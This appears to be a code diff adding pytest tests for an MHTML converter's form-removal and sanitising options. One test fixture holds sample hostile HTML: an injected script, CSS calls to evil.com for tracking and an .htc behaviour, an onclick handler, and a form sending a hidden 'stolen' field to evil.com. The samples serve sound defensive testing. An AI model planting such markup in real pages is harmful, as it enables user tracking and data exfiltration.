@@ -409,3 +409,170 @@ Content-Type: text/html
             
         finally:
             pass  # tmp_path cleanup handled by pytest
+    
+    def test_convert_with_remove_forms_enabled(self):
+        """Test conversion with form removal enabled"""
+        mhtml_with_forms = """From: <Saved by Blink>
+MIME-Version: 1.0
+Content-Type: multipart/related; boundary="test"
+
+--test
+Content-Type: text/html
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Test Page</title>
+</head>
+<body>
+    <h1>Hello World</h1>
+    <form action="/submit" method="post">
+        <label for="name">Name:</label>
+        <input type="text" id="name" name="name">
+        <textarea name="message" placeholder="Message"></textarea>
+        <select name="category">
+            <option value="general">General</option>
+            <option value="support">Support</option>
+        </select>
+        <button type="submit">Submit</button>
+        <input type="hidden" name="csrf" value="token">
+    </form>
+    <p>Good content</p>
+    <fieldset>
+        <legend>Additional Info</legend>
+        <input type="checkbox" name="newsletter">
+    </fieldset>
+    <datalist id="suggestions">
+        <option value="Option 1">
+        <option value="Option 2">
+    </datalist>
+</body>
+</html>
+
+--test--
+"""
+        
+        # Test with remove_forms=True
+        converter = MHTMLConverter(remove_forms=True)
+        result = converter.convert(mhtml_with_forms)
+        
+        # Should remove all form elements
+        assert '<form' not in result
+        assert '<input' not in result
+        assert '<textarea' not in result
+        assert '<select' not in result
+        assert '<option' not in result
+        assert '<button' not in result
+        assert '<fieldset' not in result
+        assert '<legend' not in result
+        assert '<label' not in result
+        assert '<datalist' not in result
+        
+        # Should preserve good content
+        assert '<h1>Hello World</h1>' in result
+        assert '<p>Good content</p>' in result
+        assert '<title>Test Page</title>' in result
+    
+    def test_convert_with_remove_forms_disabled(self):
+        """Test conversion with form removal disabled (default)"""
+        mhtml_with_forms = """From: <Saved by Blink>
+MIME-Version: 1.0
+Content-Type: multipart/related; boundary="test"
+
+--test
+Content-Type: text/html
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Test Page</title>
+</head>
+<body>
+    <h1>Hello World</h1>
+    <form action="/submit">
+        <input type="text" name="name">
+        <button type="submit">Submit</button>
+    </form>
+    <p>Good content</p>
+</body>
+</html>
+
+--test--
+"""
+        
+        # Test with remove_forms=False (default)
+        converter = MHTMLConverter(remove_forms=False)
+        result = converter.convert(mhtml_with_forms)
+        
+        # Should preserve all form elements
+        assert '<form' in result
+        assert '<input' in result
+        assert '<button' in result
+        assert 'action="/submit"' in result
+        assert 'type="text"' in result
+        assert 'type="submit"' in result
+        
+        # Should also preserve good content
+        assert '<h1>Hello World</h1>' in result
+        assert '<p>Good content</p>' in result
+    
+    def test_convert_with_multiple_security_options(self):
+        """Test conversion with multiple security options enabled"""
+        mhtml_with_threats = """From: <Saved by Blink>
+MIME-Version: 1.0
+Content-Type: multipart/related; boundary="test"
+
+--test
+Content-Type: text/html
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Test Page</title>
+    <script>alert('malicious')</script>
+    <style>
+        body { background: url('http://evil.com/track.png'); }
+        .test { behavior: url('evil.htc'); }
+    </style>
+</head>
+<body onclick="track()">
+    <h1>Hello World</h1>
+    <form action="http://evil.com/submit">
+        <input type="hidden" name="stolen" value="data">
+        <button type="submit">Submit</button>
+    </form>
+    <p>Good content</p>
+</body>
+</html>
+
+--test--
+"""
+        
+        # Test with all security options enabled
+        converter = MHTMLConverter(
+            remove_javascript=True,
+            sanitize_css=True,
+            remove_forms=True
+        )
+        result = converter.convert(mhtml_with_threats)
+        
+        # Should remove JavaScript threats
+        assert '<script>' not in result
+        assert 'alert(' not in result
+        assert 'onclick=' not in result
+        
+        # Should remove CSS threats
+        assert 'url(' not in result
+        assert 'behavior:' not in result
+        assert 'http://evil.com/track.png' not in result
+        
+        # Should remove form threats
+        assert '<form' not in result
+        assert '<input' not in result
+        assert '<button' not in result
+        assert 'http://evil.com/submit' not in result
+        
+        # Should preserve good content
+        assert '<h1>Hello World</h1>' in result
+        assert '<p>Good content</p>' in result
+        assert '<title>Test Page</title>' in result
